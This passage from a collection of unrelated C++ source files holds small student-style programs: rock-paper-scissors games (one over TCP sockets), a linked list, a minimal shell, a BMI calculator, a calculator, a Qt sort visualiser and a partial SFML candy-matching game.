valido.\\n\";\r\n            }\r\n        }\r\n    }\r\n\r\n    Soldadoslista.push_back(soldado1);\r\n}\r\n\r\nvoid creaciondeequipos()\r\n{\r\n    system(\"cls\");",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nusing i8 = int8_t;\nusing i16 = int16_t;\nusing i32 = int32_t;\nusing i64 = int64_t;\nusing isize = ptrdiff_t;\nusing u8 = uint8_t;\nusing u16 = uint16_t;\nusing u32 = uint32_t;\nusing u64 = uint64_t;\nusing usize = size_t;\nusing f32 = float_t;\nusing f64 = double_t;\n\ninline constexpr i32 Modulus = 1e9 + 7;\n\nint main(void)\n{\n    ios_base::sync_with_stdio(false);\n    cin.tie(nullptr);\n    cout.tie(nullptr);\n\n    usize q;\n    cin >> q;\n\n    while (q > 0)\n    {\n        q -= 1;\n\n        u64 k;\n        cin >> k;\n\n        u64 digit = 1, coefficient = 9, num = 1;\n        while (k > coefficient * num)\n        {\n            k -= coefficient * num;\n            digit += 1;\n            coefficient += 9;\n            num *= 10;\n        }\n\n        k -= 1;\n        u64 target = num + k / digit;\n        u64 mod = digit - (k % digit);\n        while (mod > 1)\n        {\n            target /= 10;\n            mod -= 1;\n        }\n\n        cout << target % 10 << '\\n';\n    }\n\n    return 0;\n}\n",
    "#include \"Classes.h\"\n#include <iostream>\n#include <ws2tcpip.h>\n#pragma comment(lib, \"Ws2_32.lib\")\n\nServer::Server() {}\n\nbool Server::isConnected()\n{\n\tconst int MAXSTRLEN = 255;\n\tWSADATA wsaData;\n\tsockaddr_in addr;\n\n\tWSAStartup(MAKEWORD(2, 2), &wsaData);\n\n\tsocket_ = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\n\taddr.sin_family = AF_INET;\n\tinet_pton(AF_INET, ip_addr_.c_str(), &addr.sin_addr);\n\taddr.sin_port = htons(8181);\n\n\tbind(socket_, (SOCKADDR*)&addr, sizeof(addr));\n\tlisten(socket_, 1);\n\tsocketClient_ = accept(socket_, NULL, NULL);\n\n\tif (socketClient_ <= -1)\n\t{\n\t\treturn false;\n\t}\n\telse\n\t{\n\t\treturn true;\n\t}\n}\n\nServer::~Server()\n{\n\tclosesocket(socketClient_);\n\tclosesocket(socket_);\n\tWSACleanup();\n}\n\nvoid Server::send_message(const std::string& message)\n{\n\tsend(socketClient_, message.c_str(), message.size(), 0);\n}\n\nstd::string Server::recive_message()\n{\n\tchar buf[200];\n\tint i = recv(socketClient_, buf, 200, 0);\n\n\treturn buf;\n}\n\nvoid Server::playRound(int roundNumber, int roundsToPlay)\n{\n\tstd::cout << \"Round \" << roundNumber << \" (Server)\" << std::endl;\n\n\tint serverChoice = generateChoice();\n\tsend_message(std::to_string(serverChoice));\n\n\tint clientChoice = std::stoi(recive_message());\n\tdetermineWinner(serverChoice, clientChoice);\n}\n\nvoid Server::playGame(int roundsToPlay)\n{\n\tfor (int round = 1; round <= roundsToPlay; ++round)\n\t{\n\t\tplayRound(round, roundsToPlay);\n\t}\n\tstd::cout << \"Game over!\" << std::endl;\n}\n\nint Server::generateChoice()\n{\n\tint answer;\n\tstd::cout << \"Enter your turn: (1 - Rock, 2 - Paper, 3 - Scissors)\";\n\tstd::cin >> answer;\n\n\treturn answer;\n}\n\nvoid Server::determineWinner(int serverChoice, int clientChoice)\n{\n\tif (serverChoice == clientChoice)\n\t{\n\t\tstd::cout << \"It's a tie!\" << std::endl;\n\t}\n\telse if ((serverChoice == 1 && clientChoice == 3) || (serverChoice == 2 && clientChoice == 1) || (serverChoice == 3 && clientChoice == 2))\n\t{\n\t\tstd::cout << \"You wins!\" << std::endl;\n\t}\n\telse\n\t{\n\t\tstd::cout << \"You lose!\" << std::endl;\n\t}\n}\n\nClient::Client()\n{\n\tconst int MAXSTRLEN = 255;\n\tWSADATA wsaData;\n\tsockaddr_in addr;\n\tWSAStartup(MAKEWORD(2, 2), &wsaData);\n\tsocket_ = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\taddr.sin_family = AF_INET;\n\tinet_pton(AF_INET, ip_addr_.c_str(), &addr.sin_addr);\n\taddr.sin_port = htons(8181);\n\tconnect(socket_, (SOCKADDR*)&addr, sizeof(addr));\n}\n\nClient::~Client()\n{\n\tclosesocket(socket_);\n\tWSACleanup();\n}\n\nvoid Client::send_message(const std::string& message)\n{\n\tsend(socket_, message.c_str(), message.size(), 0);\n}\n\nstd::string Client::recive_message()\n{\n\tchar buf[200];\n\tint i = recv(socket_, buf, 200, 0);\n\n\treturn buf;\n}\n\nvoid Client::playRound(int roundNumber, int roundsToPlay)\n{\n\tstd::cout << \"Round \" << roundNumber << \" (Client)\" << std::endl;\n\n\tint clientChoice = std::stoi(recive_message());\n\tint serverChoice = generateChoice();\n\n\tsend_message(std::to_string(serverChoice));\n\tdetermineWinner(serverChoice, clientChoice);\n}\n\nvoid Client::playGame(int roundsToPlay)\n{\n\tfor (int round = 1; round <= roundsToPlay; ++round)\n\t{\n\t\tplayRound(round, roundsToPlay);\n\t}\n\tsystem(\"cls\");\n\tstd::cout << \"Game over!\" << std::endl;\n\tsystem(\"pause\");\n}\n\nint Client::generateChoice()\n{\n\tint answer;\n\tstd::cout << \"Enter your turn: (1 - Rock, 2 - Paper, 3 - Scissors)\";\n\tstd::cin >> answer;\n\n\treturn answer;\n}\n\nvoid Client::determineWinner(int serverChoice, int clientChoice)\n{\n\tif (serverChoice == clientChoice)\n\t{\n\t\tstd::cout << \"It's a tie!\" << std::endl;\n\t}\n\telse if ((clientChoice == 1 && serverChoice == 3) || (clientChoice == 2 && serverChoice == 1) || (clientChoice == 3 && serverChoice == 2))\n\t{\n\t\tstd::cout << \"Client wins!\" << std::endl;\n\t}\n\telse\n\t{\n\t\tstd::cout << \"Server wins!\" << std::endl;\n\t}\n}\n\nint menu(Server server)\n{\n\tstd::cout << \"\\tWelcome to my game!!!\\n How many times do you want to play the game?\\n\";\n\n\tint roundsToPlay;\n\tstd::cin >> roundsToPlay;\n\n\tstd::cout << \"\\n\\tLet's go\\n\";\n\n\tserver.send_message(std::to_string(roundsToPlay));\n\n\treturn roundsToPlay;\n}",
    "#include <bits/stdc++.h>\r\nusing namespace std;\r\n\r\nclass node\r\n{\r\npublic:\r\n    int data;\r\n    node *next;\r\n\r\n    node(int data)\r\n    {\r\n        this->data = data;\r\n        this->next = NULL;\r\n    }\r\n};\r\n\r\nvoid insertNode(node *&tail, int elem, int data)\r\n{\r\n    if (tail == NULL)\r\n    {\r\n        node *n = new node(data);\r\n        tail = n;\r\n        n->next = n;\r\n    }\r\n    else\r\n    {\r\n        node *temp = tail;\r\n        while (temp->data != elem)\r\n        {\r\n            temp = temp->next;\r\n        }\r\n        // 0->0->0->0->0->\r\n        node *n = new node(data);\r\n        n->next = temp->next;\r\n        temp->next = n;\r\n    }\r\n}\r\n\r\nvoid deleteNode(node* &tail,int val){\r\nif(tail==NULL){\r\n    cout<<\"No data in list can't delete anything.\";\r\n}\r\nelse{\r\n    node*& prev= tail;\r\n    node* cur=prev->next;\r\n\r\n    while(cur->data!=val){\r\n        prev= cur;\r\n        cur=cur->next;\r\n\r\n    }\r\n    prev->next=cur->next;\r\n    if(cur==prev){//single element\r\n        tail=NULL;\r\n    }\r\n    if(tail==cur){//>2 elem\r\n        tail=prev;\r\n    }\r\n    cur->next=NULL;\r\n    delete cur;\r\n}\r\n}\r\n\r\nvoid printList(node * tail)\r\n{\r\n    node *temp = tail;\r\nif(tail==NULL){\r\n    cout<<\"nothing to print.\";\r\n    return;\r\n}\r\n    // while(tail->next!=temp){\r\n    //     cout<<temp->data<<\">\";\r\n    //     temp=temp->next;\r\n    // }////if there is only one element in the list it will not print it so better to use the do whle loop\r\n\r\n    do\r\n    {\r\n        cout << tail->data << \"->\";\r\n        tail = tail->next;\r\n    } while (tail != temp);\r\n}\r\nint main()\r\n{\r\n\r\n    node *tail = NULL;\r\n\r\n    insertNode(tail, 2, 1);\r\n    insertNode(tail, 1, 5);\r\n    insertNode(tail, 5, 15);\r\n    deleteNode(tail,5);\r\n    printList(tail);\r\n\r\n    return 0;\r\n}",
    "#include <iostream>\r\n#include <windows.h>\r\n#include <cstdlib> // For rand() and srand()\r\n#include <ctime> \r\n#include \"project1.h\"\r\nusing namespace std;\r\n\r\nenum choices\r\n{\r\n    paper = 3, stone = 2, scissors = 1\r\n};\r\n\r\nint main()\r\n{\r\n    bool ans = true;\r\n    while (ans){\r\n        int c_win = 0, p_win = 0, no_win = 0;\r\n        srand(static_cast<unsigned int>(time(0)));\r\n        int num; cout << \"What the number of rounds you want to play ? \\n\"; cin >> num; cout << endl;\r\n        int scissors = 1, stone = 2, paper = 3;\r\n        for (int i = 1; i <= num; i++){\r\n            int player_choice;\r\n            cout << \"Round [ \" << i << \" ] begin : \\n\";\r\n            cout << \"\\nyour choice : [1]scissors , [2]stone , [3]paper ? \"; cin >> player_choice;\r\n            if (player_choice < 1 || player_choice > 3){\r\n                cout << \"Invalid choice! Please choose 1, 2, or 3.\\n\";\r\n                i--;\r\n                continue;\r\n            }\r\n            int computer_choice = rand() % 3 + 1;\r\n            cout << \"\\n------------------Round[ \" << i << \" ]---------------------\\n\";\r\n            cout << \"Player choice : \";\r\n            if (player_choice == 1){\r\n                cout << \"scissors\\n\";\r\n            }\r\n            else if (player_choice == 2){\r\n                cout << \"stone\\n\";\r\n            }\r\n            if (player_choice == 3){\r\n                cout << \"paper\\n\";\r\n            }\r\n            cout << \"computer choice : \";\r\n            if (computer_choice == 1){\r\n                cout << \"scissors\\n\";\r\n            }\r\n            else if (computer_choice == 2){\r\n                cout << \"stone\\n\";\r\n            }\r\n            if (computer_choice == 3){\r\n                cout << \"paper\\n\";\r\n            }\r\n            if ((computer_choice == 1 && player_choice == 3) || (computer_choice == 2 && player_choice == 1) || (computer_choice == 3 && player_choice == 2)){\r\n                cout << \"Round Winner : [Computer]\\n\";\r\n                cout << \"------------------------------------------------\\n\\n\\n\";\r\n                 Beep(500, 1500);\r\n                 cin.get();\r\n                system(\"color 4e\");\r\n                c_win++;\r\n            }\r\n            else if ((computer_choice == 3 && player_choice == 1) || (computer_choice == 1 && player_choice == 2) || (computer_choice == 2 && player_choice == 3)){\r\n                cout << \"Round Winner : [Player]\\n\";\r\n                cout << \"------------------------------------------------\\n\\n\\n\";\r\n                system(\"color 2F\");\r\n                p_win++;\r\n            }\r\n            else if (computer_choice == player_choice){\r\n                cout << \"No winner in this Round!\\n\";\r\n                cout << \"------------------------------------------------\\n\\n\\n\";\r\n                system(\"color 3F\");\r\n                no_win++;\r\n            }\r\n\r\n        }\r\n        cout << \"                           ---------------------------------------------\\n\\n\";\r\n        cout << \"                                 +++  G A M E    O V E R +++ \\n\\n\";\r\n        cout << \"                           ---------------------------------------------\\n\\n\";\r\n        cout << \"                           ___________[G A M E  R E S U L T S]___________\\n\\n\";\r\n        cout << \"                           Game Rounds        : \" << num; cout << \"\\n\\n\";\r\n        cout << \"                           Player win Times   : \" << p_win; cout << \"\\n\\n\";\r\n        cout << \"                           Player lost Times  : \" << c_win; cout << \"\\n\\n\";\r\n        cout << \"                           Computer win Times : \" << c_win; cout << \"\\n\\n\";\r\n        cout << \"                           Draw Times         : \" << no_win; cout << \"\\n\\n\";\r\n        cout << \"                           The Winner         : \";\r\n        if (p_win > c_win){\r\n            cout << \"[Player] \\n\\n\";\r\n        }\r\n        else if (p_win < c_win){\r\n            cout << \"[Computer] \\n\\n\";\r\n        }\r\n        else{\r\n            cout << \"[No Winner] \\n\\n\";\r\n        }\r\n        cout << \"                           ______________________________________________\\n\\n\";\r\n        char p_ans;\r\n        cout << \"                           Do you want to play Again? Y/N? \"; cin >> p_ans;\r\n        if ( p_ans == 'Y' || p_ans == 'y' ){\r\n            ans = true;\r\n        }\r\n        else if (p_ans == 'N' || p_ans == 'n'){\r\n            ans = false;\r\n        }\r\n        else{\r\n            cout << \"Invalid answer : exsiting.........\\n\";\r\n            ans = false;\r\n        }\r\n    }\r\n    return 0;\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"exam\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff#include <iostream>\n#include <string>\n#include <algorithm>\n#include <fstream>\n\nusing namespace std;\n\n\nclass Discipline\n{\npublic:\n    string Title, ControlType;\n\tint TotalHours;\n\t\n    Discipline() {}\n\n    Discipline(string title, int totalHours, string controlType)\n        : Title(title), TotalHours(totalHours), ControlType(controlType) {\n\n    }\n\n    void print() const {\n        cout\n            << \"\u041d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u0434\u0438\u0441\u0446\u0438\u043f\u043b\u0438\u043d\u044b - \" << Title << \"\\n\"\n            << \"\u041a\u043e\u043b-\u0432\u043e \u0447\u0430\u0441\u043e\u0432 - \" << TotalHours << \"\\n\"\n            << \"\u0424\u043e\u0440\u043c\u0430 \u043a\u043e\u043d\u0442\u0440\u043e\u043b\u044f - \" << ControlType << \"\\n\";\n    };\n\n};\n\nbool compareAscendig(const Discipline& a, const Discipline& b) {\n    return a.Title < b.Title;\n}\n\nbool compareDescending(const Discipline& a, const Discipline& b) {\n    return a.Title > b.Title;\n}\n\nvoid addDiscipline(Discipline disciplines[], int& disciplinesCount) {\n    Discipline discipline;\n\n    cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435:\";\n    cin.ignore();\n    getline(cin, discipline.Title);\n\n    cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435\u043a\u043e\u043b-\u0432\u043e \u0447\u0430\u0441\u043e\u0432:\";\n    cin.ignore();\n    cin >> discipline.TotalHours;\n\n    cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0444\u043e\u0440\u043c\u0443 \u043a\u043e\u043d\u0442\u0440\u043e\u043b\u044f:\";\n    cin.ignore();\n    getline(cin, discipline.ControlType);\n\n    disciplines[disciplinesCount++] = discipline;\n}\n\nvoid writeDisciplineToFile(Discipline disciplines[], int disciplinesCount, const string& filename) {\n    ofstream file(filename);\n    if (!file.is_open()) {\n        return;\n    }\n\n    for (int i = 0; i < disciplinesCount; i++)\n    {\n        Discipline discipline = disciplines[i];\n     \n        file << discipline.Title << endl;\n        file << discipline.TotalHours << endl;\n        file << discipline.ControlType << endl;\n    }\n\n    file.close();\n}\n\nint main()\n{\n    setlocale(LC_ALL, \"RU\");\n    system(\"chcp 1251\");\n\n    const int MAX_DISCIPLINES = 20;\n\n    Discipline disciplines[MAX_DISCIPLINES];\n    \n    int disciplinesCount = 0;\n    string filename = \"desciplines.txt\";\n\n    int choice;\n    cout << \"1. \u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0434\u0438\u0441\u0446\u0438\u043f\u043b\u0438\u043d\u0443\\n2. \u0421\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0438 \u0441\u043e\u0445\u0440\u0430\u043d\u0438\u0442\u044c (\u043f\u043e \u0432\u043e\u0437\u0440\u043e\u0441\u0442\u0430\u043d\u0438\u044e)\\n3. \u0421\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u0430\u0442\u044c \u0438 \u0441\u043e\u0445\u0440\u0430\u043d\u0438\u0442\u044c (\u043f\u043e \u0443\u0431\u044b\u0432\u0430\u043d\u0438\u044e)\\n4. \u0412\u044b\u0432\u0435\u0441\u0442\u0438 \u0432\u0441\u0435 \u0434\u0438\u0441\u0446\u0438\u043f\u043b\u0438\u043d\u044b\\n5. \u0412\u044b\u0445\u043e\u0434\\n\";\n    while (true) {\n        cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u044f: \";\n        cin >> choice;\n\n        switch (choice) {\n        case 1:\n            addDiscipline(disciplines, disciplinesCount);\n            break;\n        case 2:\n            sort(disciplines, disciplines + disciplinesCount, compareAscendig);\n            writeDisciplineToFile(disciplines, disciplinesCount, filename);\n            break;\n        case 3:\n            sort(disciplines, disciplines + disciplinesCount, compareDescending);\n            writeDisciplineToFile(disciplines, disciplinesCount, filename);\n            break;\n        case 4:\n            for (int i = 0; i < disciplinesCount; i++)\n            {\n                disciplines[i].print();\n                cout << endl;\n            }\n            break;\n        case 5:\n            return 0;\n        default:\n            cout << \"\u0414\u0435\u0439\u0441\u0442\u0432\u0438\u0435 \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\u043e\\n\";\n            break;\n        }\n    }\n\n    return 0;\n}\n",
    "//---------------------------------------------------------------------------\n\n#include <vcl.h>\n#pragma hdrstop\n\n#include \"uIMC.h\"\n//---------------------------------------------------------------------------\n#pragma package(smart_init)\n#pragma resource \"*.dfm\"\nTForm1 *Form1;\n//---------------------------------------------------------------------------\n__fastcall TForm1::TForm1(TComponent* Owner)\n\t: TForm(Owner)\n{\n}\n//---------------------------------------------------------------------------\nvoid __fastcall TForm1::Button1Click(TObject *Sender)\n{\n\tdouble imc;\n\tPanel1->Visible= true;\n\tPanel2->Visible= true;\n\tPanel3->Visible= true;\n\tPanel4->Visible= true;\n\n\timc = StrToFloat(Edit3->Text) / (StrToFloat(Edit2->Text) * StrToFloat(Edit2->Text));\n\tLabel4->Caption = \"IMC=\" +FormatFloat(\"0.00\",imc);\n\tif (imc<18.5) {\n\t\tLabel4->Caption=Label4->Caption+ \". Abaixo do Peso. \"+Edit1->Text+\", procure um m\u00e9dico\";\n       Panel2->Visible=false;\n\t}else{\n        if (imc>=18.5 && imc<=24.9) {\n           Label4->Caption=Label4->Caption+ \". Peso Ideal. \"+Edit1->Text+\", parab\u00e9ns\";\n           Panel1->Visible=false;\n          }else{\n                if (imc>24.9 && imc<=29.9) {\n\t               \tLabel4->Caption=Label4->Caption+ \". Levemente acima do peso. \"+Edit1->Text+\", aten\u00e7\u00e3o\";\n\t                Panel3->Visible=false;\n                   \t}  else{\n\t                        if (imc>29.9 && imc<=34.9) {\n                                Label4->Caption=Label4->Caption+ \". Obesidade grau I. \"+Edit1->Text+\", fique alerta\";\n\t                            Panel4->Visible=false;\n                             }else{\n                                 Label4->Caption = Label4->Caption+ \". Obesidade grau maior que I. \"+Edit1->Text+\", procure um m\u00e9dico imediatemente!\";\n                             }\n                     \t}\n                 }\n\t}\n\n}\n//---------------------------------------------------------------------------\n\n\n\n\n\n\n",
    "#include \"shell.hpp\"\n#include <type_traits>\n\n// Breaks down command into command type and necessary \n// values for the command to run properly. Retains the \n// name of the command if it is needed.\nShellCommands::ShellCommands(std::string c, std::string v) : command_str(c), value(v) {\n    if (c == \"exit\") {\n        command = exit_val;\n    } else if (c == \"echo\") {\n        command = echo;\n    } else if (c == \"type\") {\n        command = type;\n    } else if (c == \"pwd\") {\n        command = pwd;\n    } else if (c == \"cd\") {\n        command = cd;\n    } else {\n        std::string path = get_path(c);\n        if (!path.empty()) {\n            command = exec;\n        } else {\n            command = invalid;\n        }\n    }\n}\n\n// Returns a file path as a string value. If none exists, \n// returns an empty string.\nstd::string get_path(std::string command){\n    std::string path_env = std::getenv(\"PATH\");\n    std::stringstream ss(path_env);\n    std::string path;\n    while(!ss.eof()){\n        getline(ss, path, ':');\n        std::string abs_path = path + '/' + command;\n        if(std::filesystem::exists(abs_path)){\n            return abs_path;\n        }\n    }\n    return \"\";  \n}\n\n// Sets up and receives the next command, then returns the\n// formatted command struct.\nShellCommands getCommand(void) {\n    std::string input;\n    // Clears flags for command line and errors\n    std::cout << std::unitbuf;\n    std::cerr << std::unitbuf;\n\n    std::cout << \"$ \";\n    std::getline(std::cin, input);\n\n    // Divide entered command into the command type and\n    // values necessary for the command to run, and create\n    // new command data structure\n    std::string command_type = input.substr(0, input.find(' '));\n    std::string command_value = input.substr(input.find(' ')+1);\n\n    ShellCommands new_command(command_type, command_value);\n    return new_command;\n}\n\n// Responsible for running the provided command. Returns true\n// if the \"exit\" command was invoked, otherwise returns false.\nbool execute_commands(ShellCommands current_command) {\n    std::string path;\n    switch (current_command.command) {\n    // Exits the shell. Returns true to close program\n    case exit_val:\n        return true;\n    // Prints the following string\n    case echo:\n        std::cout << current_command.value << \"\\n\";\n        return false;\n    // Returns data about the command that follows the \"type\"\n    // command. Lets user know if it is a builtin shell command\n    // or it's location if it is an executable file. Returns \n    // \"not found\" if neither\n    case type:\n        if (current_command.value == \"echo\" || current_command.value == \"exit\" || current_command.value == \"type\" || current_command.value == \"pwd\" || current_command.value == \"cd\") {\n            std::cout << current_command.value << \" is a shell builtin\\n\";\n        } else {\n            // Searches for file described by command input. Returns\n            // file path if executable found, otherwise returns empty\n            // string.\n            path = get_path(current_command.value);\n            if(path.empty()){\n                std::cout << current_command.value << \": not found\\n\";\n            } else{\n                std::cout << current_command.value << \" is \" << path << std::endl;\n            }\n        }\n        return false;\n    // Searches for executable to run.\n    case exec:\n        path = get_path(current_command.command_str) + \" \" + current_command.value;\n        system(path.c_str());\n        return false;\n    // Prints out the current directory path.\n    case pwd:\n        path = std::filesystem::current_path();\n        std::cout << path << std::endl;\n        return false;\n    // Changes current directory. If input is \"~\", return to home\n    // directory. Else try to redirect to the directory listed. If \n    // directory doesn't exist, inform user. \n    case cd:\n        if (current_command.value == \"~\") {\n            std::filesystem::current_path(std::getenv(\"HOME\"));\n            return false;\n        }\n        try {\n            std::filesystem::current_path(current_command.value);\n        } catch(std::filesystem::filesystem_error const& e) {\n            std::cout << \"cd: \" << current_command.value << \": No such file or directory\\n\";\n        }\n        return false;\n    // Invalid command used.\n    default:\n        std::cout << current_command.command_str << \": command not found\\n\";\n        return false;\n    }\n}",
    "#include \"BubbleSort.h\"\r\n#include <QThread>\r\n#include <QTimer>\r\n\r\nBubbleSort::BubbleSort(MainWindow *visual) : visual(visual), array(visual->getArray())\r\n{\r\n}\r\n\r\nvoid BubbleSort::startSort()\r\n{\r\n    QThread *thread = new QThread;\r\n    this->moveToThread(thread);\r\n\r\n    connect(thread, &QThread::started, this, &BubbleSort::runSort);\r\n    connect(this, &BubbleSort::finished, thread, &QThread::quit);\r\n    connect(thread, &QThread::finished, thread, &QThread::deleteLater);\r\n\r\n    thread->start();\r\n}\r\n\r\nvoid BubbleSort::runSort()\r\n{\r\n    QThread::msleep(500);\r\n\r\n    int n = array.n;\r\n    for (int i = 0; i < n - 1; i++) {\r\n        bool exchange = false;\r\n        for (int j = n - 1; j > i; j--) {\r\n            if (array.get(j) < array.get(j - 1)) {\r\n                // \u4ea4\u6362\u5143\u7d20\r\n                int temp = array.get(j);\r\n                array.set(array.get(j - 1), j);\r\n                array.set(temp, j - 1);\r\n                exchange = true;\r\n            }\r\n            QThread::msleep(5);\r\n            visual->update();\r\n        }\r\n        if (!exchange) break;\r\n    }\r\n\r\n    QThread::msleep(2000);\r\n    emit finished();\r\n}\r\n",
    "//\n// Created by kpyli on 03.07.2024.\n//\n\n#include \"composite/Folder.h\"\n\n#include <thread>\n#include <composite/File.h>\n\nFolder::Folder(const fs::path& path) : Component(path) {\n    if(!is_directory(_path)) {\n        throw std::invalid_argument(\"Invalid path type: \" + _path.string());\n    }\n}\n\nvoid Folder::LoadContents() {\n    for(const auto& entry: fs::directory_iterator(_path)) {\n        if(entry.is_directory()) {\n            auto folder = std::make_shared<Folder>(entry.path());\n            this->AddChild(folder);\n            folder->LoadContents();\n        }\n        else\n            this->AddChild(std::make_shared<File>(entry.path()));\n    }\n}\n\nvoid Folder::AddChild(std::shared_ptr<Component> component) {\n    if (!component) return;\n\n    std::lock_guard lock(_mutex);\n\n    component->SetParrent(shared_from_this());\n    _children.push_back(component);\n}\n\nvoid Folder::Search(std::string &searchString, std::vector<std::string> &results) const {\n    std::vector<std::thread> threads;\n    std::vector<std::vector<std::string>> partialResults(_children.size());\n\n    {\n        std::lock_guard lock(_mutex);\n        int index = 0;\n\n        for(const auto& child: _children) {\n            threads.emplace_back([&, index] {\n                child->Search(searchString, partialResults[index]);\n            });\n            ++index;\n        }\n\n        for(auto& thread: threads) {\n            thread.join();\n        }\n\n        for(const auto& partialResult: partialResults) {\n            results.insert(results.end(), partialResult.begin(), partialResult.end());\n        }\n    }\n}",
    "#include<bits/stdc++.h>\n#include<iostream>\nusing namespace std;\n\nint main()\n{\n    int i;\n    do\n    {\n        cout << \"\\n___________________ WELCOME TO MY SIMPLE CALCULATOR ____________________\\n\" << endl;\n        int x, y;\n        int op;\n        cout << \"Enter first number : \";\n        cin >> x;\n        cout << \"Enter second number : \";\n        cin >> y;\n        cout << \"\\n___________________________________________________________________________\\n\" << endl;\n        cout << \"Press 1 for Addition (+) >>>\" << endl;\n        cout << \"Press 2 for Subtraction (-) >>>\" << endl;\n        cout << \"Press 3 for Multiplication (*) >>>\" << endl;\n        cout << \"Press 4 for Division-Quotient (/) >>>\" << endl;\n        cout << \"Press 5 for D-Remainder (%) >>>\" << endl;\n        cout << \"Press 6 for Power (^) >>>\" << endl;\n        cout << \"\\nSelect any Operation : \";\n        cin >> op;\n        cout << \"\\nYour Answer is : \";\n\n        switch (op)\n        {\n        case 1:\n            cout << (x + y) << endl;\n            break;\n        case 2:\n            cout << (x - y) << endl;\n            break;\n        case 3:\n            cout << (x * y) << endl;\n            break;\n        case 4:\n            cout << (x / y) << endl;\n            break;\n        case 5:\n            cout << (x % y) << endl;\n            break;\n        case 6:\n            cout << pow(x, y) << endl;\n            break;\n        default:\n            cout << \"invalid operation...! Please Try Again...\\n\";\n            break;\n        }\n        cout << \"\\n-----------------------------------------------------------------------------\\n\" << endl;\n        cout << \"Press 1 to Continue >>>\" << endl;\n        cout << \"Press 0 to exit >>>\" << endl;\n        cout << \"\\nDo You want to Continue? (1/0) : \";\n        cin >> i;\n    }\n    while (i);\n\n    cout << \"\\nThank You for using this Calculator...!\\n\";\n\n    return 0;\n}",
    "#include <iostream>\n#include <SFML/Graphics.hpp>\n#include <SFML/System/Clock.hpp>\n#include <fstream>\n#include <cstdlib>\n#include <ctime>\n\nusing namespace std;\nusing namespace sf;\n\nconst int MaxGridSize = 7, MinGridSize = 6;\nint Score = 0, TargetScore = 100000000000, Moves = 20;\nint Game[MaxGridSize][MaxGridSize];\n\nbool WinCheck() {\n    return Score >= TargetScore;\n}\nbool FailCheck() {\n    return Moves == 0;\n}\n\nvoid DeallocateGame(int GridSize) {\n    for (int i = 0; i < GridSize; i++) {\n        for (int j = 0; j < GridSize; j++) {\n            Game[i][j] = 0;\n        }\n    }\n}\n\n//FUNCTION: Candy selection using left mouse button\nvoid Select(RenderWindow& window, RectangleShape& r1, int& selectedX, int& selectedY, int GridSize) {\n    if (Mouse::isButtonPressed(Mouse::Left)) {\n        Vector2i mousePos = Mouse::getPosition(window);\n        selectedX = (mousePos.x - ((1366 - GridSize * 100) / 2)) / 100;\n        selectedY = (mousePos.y - ((768 - GridSize * 100) / 2)) / 100;\n\n        //Check if selected position is within grid boundaries\n        if (selectedX >= 0 && selectedX < GridSize && selectedY >= 0 && selectedY < GridSize) {\n            r1.setPosition(selectedX * 100 + ((1366 - GridSize * 100) / 2), selectedY * 100 + ((768 - GridSize * 100) / 2));\n        }\n    }\n}\n\n//FUNCTION: Swap candies in grid\nvoid SwapCandies(int selectedX, int selectedY, int direction, int GridSize) {\n    int TargetX = selectedX, TargetY = selectedY;\n\n    //Determine target position based on direction\n    switch (direction) {\n    case 0: TargetY--; break;\n    case 1: TargetY++; break;\n    case 2: TargetX--; break;\n    case 3: TargetX++; break;\n    }\n\n    if (TargetX >= 0 && TargetX < GridSize && TargetY >= 0 && TargetY < GridSize) {        \n        swap(Game[selectedX][selectedY], Game[TargetX][TargetY]);//Swap candies in grid\n    }\n}\n\n//FUNCTION: Check for matches and remove candies\nvoid CheckMatches(int GridSize) {\n    //Loop through each cell in grid\n    for (int i = 0; i < GridSize; i++) {\n        for (int j = 0; j < GridSize; j++) {\n            int CurrentCandy = Game[i][j];//Value of current candy\n\n            //Elbow (bottom-right) candies\n            if (i + 1 < GridSize && j + 1 < GridSize && Game[i + 1][j] == CurrentCandy && Game[i + 1][j + 1] == CurrentCandy) {\n                Score += 15;\n                Game[i][j] = Game[i + 1][j] = Game[i + 1][j + 1] = 0;\n            }\n            //Elbow (bottom-left) candies\n            else if (i + 1 < GridSize && j - 1 >= 0 && Game[i + 1][j] == CurrentCandy && Game[i + 1][j - 1] == CurrentCandy) {\n                Score += 15;\n                Game[i][j] = Game[i + 1][j] = Game[i + 1][j - 1] = 0;\n            }\n            //Elbow (top-right) candies\n            else if (i - 1 >= 0 && j + 1 < GridSize && Game[i - 1][j] == CurrentCandy && Game[i - 1][j + 1] == CurrentCandy) 